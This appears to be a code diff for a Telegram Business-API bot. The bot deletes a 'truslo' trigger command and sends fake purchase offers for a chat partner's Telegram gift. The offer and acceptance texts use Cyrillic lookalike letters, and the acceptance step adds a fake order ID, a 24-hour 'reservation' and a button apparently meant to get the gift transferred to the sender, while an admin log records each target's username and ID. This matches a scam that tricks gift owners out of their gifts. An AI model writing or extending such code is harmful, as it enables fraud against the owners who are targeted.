@@ -53,15 +53,13 @@ def log_telegram_error(prefix: str, e: Exception, **ctx):
     if isinstance(e, TelegramRetryAfter):
         logger.error(f"[{prefix}] ⏳ FLOOD_WAIT retry_after={e.retry_after}s | {ctx_str}")
         return
-
     if isinstance(e, TelegramForbiddenError):
         logger.error(f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}")
         return
 
     msg = str(e)
-
     if "PEER_FLOOD" in msg:
-        logger.error(f"[{prefix}] 🚨 PEER_FLOOD — Telegram ограничил отправку! Подожди 24-48ч. | {ctx_str} | {msg}")
+        logger.error(f"[{prefix}] 🚨 PEER_FLOOD | {ctx_str} | {msg}")
         return
     if "FLOOD_WAIT" in msg:
         logger.error(f"[{prefix}] ⏳ FLOOD_WAIT (raw) | {ctx_str} | {msg}")
@@ -87,38 +85,79 @@ def log_send_attempt(prefix: str, attempt: int, total: int, chat_id, bc_id):
 # ОТПРАВКА ЛОГОВ АДМИНУ
 # ============================================================
 
+def format_gift_name(slug: str, number: str) -> str:
+    """SnooppDogg -> Snoopp Dogg"""
+    # Разбиваем CamelCase
+    formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
+    return f"{formatted_slug} #{number}"
+
+
 def get_log_text(data: dict, status: str) -> str:
     """Формирует текст лога для админа."""
     status_emoji = "⏳"
+    status_text = "Отправлен"
+    
     if status == "accepted":
         status_emoji = "✅"
+        status_text = "Принят"
     elif status == "declined":
         status_emoji = "❌"
+        status_text = "Отклонён"
 
-    currency_name = "GRAM" if data["currency"] == "gram" else "Stars"
-    
+    gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
+    # Встраиваем ссылку и делаем жирным
+    gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'
+
+    if data["currency"] == "gram":
+        emoji_id = EMOJI_GRAM
+        emoji_char = "🪙"
+        currency_name = "GRAM"
+    else:
+        emoji_id = EMOJI_STARS
+        emoji_char = "⭐"
+        currency_name = "Stars"
+        
+    emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
+
     return (
-        f"<b>📩 Оффер отправлен</b>\n\n"
-        f"<b>Подарок:</b> {data['gift_slug']}-{data['gift_number']}\n"
-        f"<b>Сумма:</b> {data['amount']} {currency_name}\n"
-        f"<b>Отправил:</b> {data['sender_name']} (@{data['sender_username']})\n\n"
-        f"<b>Статус:</b> {status_emoji} {status.capitalize()}"
+        f"<b>Оффер отправлен</b>\n\n"
+        f"<b>Подарок:</b> {gift_display}\n"
+        f"<b>Сумма:</b> {data['amount']}\n"
+        f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
+        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
+        f"<b>Владелец подарка:</b> @{data['owner_username']} | {data['owner_id']}\n\n"
+        f"<b>Статус:</b> {status_emoji} {status_text}"
     )
+
+
+def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
+    """Формирует клавиатуру для лога."""
+    buttons = []
+    
+    # Кнопка владельца (если есть юзернейм)
+    owner_url = f"https://t.me/{data['owner_username']}" if data['owner_username'] != f"id{data['owner_id']}" else f"tg://user?id={data['owner_id']}"
+    buttons.append([
+        InlineKeyboardButton(
+            text="👤 Владелец",
+            url=owner_url
+        )
+    ])
+    
+    # Кнопка подарка (Primary — как бы основная)
+    buttons.append([
+        InlineKeyboardButton(
+            text="🔗 Ссылка на подарок",
+            url=data["link"]
+        )
+    ])
+    
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
 async def send_log_to_admin(data: dict):
-    """Отправляет первичный лог админу и сохраняет ID сообщения."""
-    text = get_log_text(data, "ожидает")
-    keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text="🔗 Посмотреть подарок",
-                    url=data["link"]
-                )
-            ]
-        ]
-    )
+    """Отправляет первичный лог админу."""
+    text = get_log_text(data, "pending")
+    keyboard = get_log_keyboard(data)
     
     try:
         msg = await bot.send_message(
@@ -139,16 +178,7 @@ async def update_log_message(data: dict, status: str):
         return
         
     text = get_log_text(data, status)
-    keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text="🔗 Посмотреть подарок",
-                    url=data["link"]
-                )
-            ]
-        ]
-    )
+    keyboard = get_log_keyboard(data)
 
     try:
         await bot.edit_message_text(
@@ -224,25 +254,16 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
             )
             logger.info(f"[send] ✅ OK msg_id={result.message_id}")
             return result
-
         except TelegramRetryAfter as e:
             log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
-            wait = e.retry_after + 1
-            logger.warning(f"[send] ждём {wait}s и повторяем...")
-            await asyncio.sleep(wait)
-
+            await asyncio.sleep(e.retry_after + 1)
         except TelegramForbiddenError as e:
             log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
             raise
-
         except TelegramBadRequest as e:
             log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
-            msg = str(e)
-
-            if "PEER_FLOOD" in msg:
-                logger.error("[send] PEER_FLOOD — прерываем ретраи")
+            if "PEER_FLOOD" in str(e):
                 raise
-
             logger.warning("[send] retry без эмодзи")
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
@@ -257,27 +278,19 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
                     business_connection_id=bc_id,
                     disable_web_page_preview=False,
                 )
-                logger.info(f"[send] ✅ OK (fallback) msg_id={result.message_id}")
                 return result
             except Exception as e2:
                 log_telegram_error("send-fallback", e2, chat_id=chat_id, bc_id=bc_id)
-                if "PEER_FLOOD" in str(e2):
+                if "PEER_FLOOD" in str(e2) or attempt == 3:
                     raise
-                if attempt == 3:
-                    raise
-
         except Exception as e:
             log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
             if attempt == 3:
                 raise
 
-    raise RuntimeError("[send] все попытки провалились")
-
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    logger.info(f"[edit] start | chat_id={chat_id} | msg_id={message_id} | bc_id={bc_id}")
     for attempt in range(1, 4):
-        log_send_attempt("edit", attempt, 3, chat_id, bc_id)
         try:
             await bot.edit_message_text(
                 business_connection_id=bc_id,
@@ -286,27 +299,12 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
                 text=text,
                 reply_markup=reply_markup,
             )
-            logger.info("[edit] ✅ OK")
             return True
-
-        except TelegramRetryAfter as e:
-            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
-            wait = e.retry_after + 1
-            logger.warning(f"[edit] ждём {wait}s и повторяем...")
-            await asyncio.sleep(wait)
-
         except TelegramBadRequest as e:
-            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
-            msg = str(e)
-
-            if "PEER_FLOOD" in msg:
-                logger.error("[edit] PEER_FLOOD — прерываем")
-                return False
-
-            if "message is not modified" in msg:
-                logger.info("[edit] сообщение не изменилось — считаем ок")
+            if "message is not modified" in str(e):
                 return True
-
+            if "PEER_FLOOD" in str(e):
+                return False
             logger.warning("[edit] retry без эмодзи")
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
@@ -321,22 +319,14 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
                     text=clean_text,
                     reply_markup=reply_markup,
                 )
-                logger.info("[edit] ✅ OK (fallback)")
                 return True
-            except Exception as e2:
-                log_telegram_error("edit-fallback", e2, chat_id=chat_id, bc_id=bc_id)
-                if "message is not modified" in str(e2):
-                    return True
-                if "PEER_FLOOD" in str(e2):
-                    return False
+            except Exception:
                 if attempt == 3:
                     return False
-
         except Exception as e:
             log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
             if attempt == 3:
                 return False
-
     return False
 
 
@@ -353,35 +343,38 @@ async def handle_business_connection(connection: BusinessConnection) -> None:
 @dp.business_message(F.text.regexp(r"(?i)^truslo\s"))
 async def handle_offer(message: Message) -> None:
     if not message.business_connection_id:
-        logger.warning("[offer] no business_connection_id")
         return
 
     bc_id = message.business_connection_id
     data = parse_offer_command(message.text)
     if not data:
-        logger.warning(f"[offer] parse failed for text: {message.text!r}")
         return
 
-    # === БЕРЁМ ДАННЫЕ ОТПРАВИТЕЛЯ ===
+    # Данные отправителя
     sender_name = "Unknown"
     sender_username = "unknown"
+    sender_id = 0
     if message.from_user:
-        sender_name = message.from_user.full_name or message.from_user.first_name or "Unknown"
+        sender_name = message.from_user.full_name
         sender_username = message.from_user.username or f"id{message.from_user.id}"
+        sender_id = message.from_user.id
 
-    logger.info(
-        f"[offer] parsed: amount={data['amount']} "
-        f"currency={data['currency']} gift={data['gift_slug']}-{data['gift_number']} "
-        f"chat_id={message.chat.id} bc_id={bc_id} "
-        f"sender={sender_name} (@{sender_username})"
-    )
+    # Данные владельца (в Business API владелец бизнес-аккаунта = отправитель)
+    # Для бизнес-аккаунтов owner_id - это тот, через кого отправлено
+    owner_id = sender_id 
+    owner_username = sender_username
+
+    # Если вы хотите брать владельца из BusinessConnection, используйте:
+    # owner_id = business_owner_ids.get(bc_id, sender_id)
+    # owner_username = f"id{owner_id}" # Для получения юзернейма нужен доп. запрос
+
+    logger.info(f"[offer] parsed: {data['gift_slug']}-{data['gift_number']} | sender=@{sender_username}")
 
     try:
         await bot.delete_business_messages(
             business_connection_id=bc_id,
             message_ids=[message.message_id],
         )
-        logger.info("[offer] команда truslo удалена")
     except Exception as e:
         log_telegram_error("offer-delete", e, chat_id=message.chat.id, bc_id=bc_id)
 
@@ -396,7 +389,6 @@ async def handle_offer(message: Message) -> None:
     else:
         emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
 
-    # В оффере пишем ник отправителя (для получателя)
     text = (
         f"Usеr <b>{sender_name}</b> оffеrs уоu "
         f"<b>{amount_fmt}</b> {emoji} "
@@ -411,7 +403,10 @@ async def handle_offer(message: Message) -> None:
         "chat_id": message.chat.id,
         "accepted": False,
         "sender_name": sender_name,
-        "sender_username": sender_username, # <-- это и есть покупатель (кому передавать)
+        "sender_username": sender_username,
+        "sender_id": sender_id,
+        "owner_username": owner_username,
+        "owner_id": owner_id,
     }
 
     keyboard = InlineKeyboardMarkup(
@@ -439,10 +434,6 @@ async def handle_offer(message: Message) -> None:
             reply_markup=keyboard,
         )
         offers[offer_id]["msg_id"] = sent.message_id
-        logger.info(
-            f"[offer] {offer_id} отправлен в чат {message.chat.id} "
-            f"(msg_id={sent.message_id})"
-        )
         
         # Отправляем лог админу
         await send_log_to_admin(offers[offer_id])
@@ -453,18 +444,9 @@ async def handle_offer(message: Message) -> None:
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def handle_decline(callback: CallbackQuery) -> None:
-    logger.info(f"[decline] callback: {callback.data}")
     _, offer_id = callback.data.split(":", 1)
     data = offers.get(offer_id)
-    if not data:
-        logger.warning(f"[decline] offer {offer_id} not found")
-        try:
-            await callback.answer()
-        except Exception:
-            pass
-        return
-    if data.get("accepted"):
-        logger.info(f"[decline] offer {offer_id} уже принят")
+    if not data or data.get("accepted"):
         try:
             await callback.answer()
         except Exception:
@@ -483,35 +465,22 @@ async def handle_decline(callback: CallbackQuery) -> None:
         f"Offer has been declined."
     )
 
-    ok = await edit_with_fallback(
+    await edit_with_fallback(
         bc_id=data["bc_id"],
         chat_id=data["chat_id"],
         message_id=data["msg_id"],
         text=decline_text,
     )
-    if ok:
-        logger.info(f"[decline] offer {offer_id} обновлён")
-    else:
-        logger.error(f"[decline] offer {offer_id} edit не удался")
-        
+    
     # Обновляем лог админа
     await update_log_message(data, "declined")
 
 
 @dp.callback_query(F.data.startswith("acc:"))
 async def handle_accept(callback: CallbackQuery) -> None:
-    logger.info(f"[accept] callback: {callback.data}")
     _, offer_id = callback.data.split(":", 1)
     data = offers.get(offer_id)
-    if not data:
-        logger.warning(f"[accept] offer {offer_id} not found")
-        try:
-            await callback.answer()
-        except Exception:
-            pass
-        return
-    if data.get("accepted"):
-        logger.info(f"[accept] offer {offer_id} уже принят")
+    if not data or data.get("accepted"):
         try:
             await callback.answer()
         except Exception:
@@ -519,10 +488,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
         return
 
     data["accepted"] = True
-    logger.info(
-        f"[accept] offer {offer_id} currency={data['currency']} "
-        f"amount={data['amount']} sender=@{data['sender_username']}"
-    )
 
     try:
         await callback.answer()
@@ -544,12 +509,9 @@ async def handle_accept(callback: CallbackQuery) -> None:
         currency_word_upper = "Stаrs"
         currency_word_lower = "stаrs"
 
-    rand_suffix = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=8)
-    )
+    rand_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
     order_id = f"ТG-{rand_suffix}"
 
-    # Подставляем username отправителя в текст
     buyer_username = data["sender_username"]
 
     accept_text = (
@@ -569,7 +531,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"Тhе rеsеrvаtiоn is vаIid fоr 24 hоurs."
     )
 
-    # Кнопка передает подарок отправителю
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -581,17 +542,13 @@ async def handle_accept(callback: CallbackQuery) -> None:
         ]
     )
 
-    ok = await edit_with_fallback(
+    await edit_with_fallback(
         bc_id=data["bc_id"],
         chat_id=data["chat_id"],
         message_id=data["msg_id"],
         text=accept_text,
         reply_markup=keyboard,
     )
-    if ok:
-        logger.info(f"[accept] offer {offer_id} обновлён (edit)")
-    else:
-        logger.error(f"[accept] offer {offer_id} edit не удался")
         
     # Обновляем лог админа
     await update_log_message(data, "accepted")
